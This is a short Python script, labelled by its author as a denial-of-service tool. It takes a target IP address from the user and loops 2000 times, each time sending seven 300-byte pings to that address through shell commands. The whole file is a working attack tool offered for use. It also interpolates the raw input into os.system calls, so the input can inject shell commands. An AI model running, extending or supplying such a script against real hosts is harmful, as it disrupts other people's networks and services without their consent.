#skidsecdostool

import os

target = input("enter the target ip here: ")

os.system("clear")

def attack1():
    for x in range(2000):
          os.system(f"ping -c 1 -s 300 {target}")
          os.system(f"ping -c 1 -s 300 {target}")
          os.system(f"ping -c 1 -s 300 {target}")
          os.system(f"ping -c 1 -s 300 {target}")
          os.system(f"ping -c 1 -s 300 {target}")
          os.system(f"ping -c 1 -s 300 {target}")
          os.system(f"ping -c 1 -s 300 {target}")
          
attack1()